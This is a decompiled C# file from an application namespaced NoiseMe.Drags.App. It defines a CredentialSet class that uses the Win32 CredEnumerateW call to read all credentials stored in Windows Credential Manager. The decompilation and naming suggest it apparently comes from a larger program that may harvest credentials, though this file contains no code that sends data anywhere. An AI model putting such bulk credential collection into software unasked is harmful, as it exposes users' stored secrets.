using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using NoiseMe.Drags.App.DTO.Linq;

namespace NoiseMe.Drags.App.Models.CredentialManagement
{
	// Token: 0x02000146 RID: 326
	public class CredentialSet : List<Credential>, IDisposable
	{
		// Token: 0x06000A97 RID: 2711 RVA: 0x0000830C File Offset: 0x0000650C
		public CredentialSet()
		{
		}

		// Token: 0x06000A98 RID: 2712 RVA: 0x00008314 File Offset: 0x00006514
		public CredentialSet(string target) : this()
		{
			if (string.IsNullOrEmpty(target))
			{
				throw new ArgumentNullException("target");
			}
			this.Target = target;
		}

		// Token: 0x17000290 RID: 656
		// (get) Token: 0x06000A99 RID: 2713 RVA: 0x00008336 File Offset: 0x00006536
		// (set) Token: 0x06000A9A RID: 2714 RVA: 0x0000833E File Offset: 0x0000653E
		public string Target { get; set; }

		// Token: 0x06000A9B RID: 2715 RVA: 0x00008347 File Offset: 0x00006547
		public void Dispose()
		{
			this.Dispose(true);
			GC.SuppressFinalize(this);
		}

		// Token: 0x06000A9C RID: 2716 RVA: 0x00021F18 File Offset: 0x00020118
		~CredentialSet()
		{
			this.Dispose(false);
		}

		// Token: 0x06000A9D RID: 2717 RVA: 0x00021F48 File Offset: 0x00020148
		private void Dispose(bool disposing)
		{
			if (!this._disposed && disposing && base.Count > 0)
			{
				base.ForEach(delegate(Credential cred)
				{
					cred.Dispose();
				});
			}
			this._disposed = true;
		}

		// Token: 0x06000A9E RID: 2718 RVA: 0x00008356 File Offset: 0x00006556
		public CredentialSet Load()
		{
			this.Loadpublic();
			return this;
		}

		// Token: 0x06000A9F RID: 2719 RVA: 0x00021F98 File Offset: 0x00020198
		private void Loadpublic()
		{
			IntPtr zero = IntPtr.Zero;
			uint num;
			if (!NativeMethods.CredEnumerateW(this.Target, 0, out num, out zero))
			{
				Trace.WriteLine(string.Format("Win32Exception: {0}", new Win32Exception(Marshal.GetLastWin32Error()).ToString()));
				return;
			}
			IntPtr[] array = new IntPtr[num];
			int num2 = 0;
			while ((long)num2 < (long)((ulong)num))
			{
				array[num2] = Marshal.ReadIntPtr(zero, IntPtr.Size * num2);
				num2++;
			}
			List<NativeMethods.CriticalCredentialHandle> list = (from ptrCred in array
			select new NativeMethods.CriticalCredentialHandle(ptrCred)).ToList<NativeMethods.CriticalCredentialHandle>();
			IEnumerable<Credential> collection = (from handle in list
			select handle.GetCredential()).Select(delegate(NativeMethods.CREDENTIAL nativeCredential)
			{
				Credential credential = new Credential();
				credential.Loadpublic(nativeCredential);
				return credential;
			});
			base.AddRange(collection);
			list.ForEach(delegate(NativeMethods.CriticalCredentialHandle handle)
			{
				handle.SetHandleAsInvalid();
			});
			NativeMethods.CredFree(zero);
		}

		// Token: 0x040003D7 RID: 983
		private bool _disposed;
	}
}
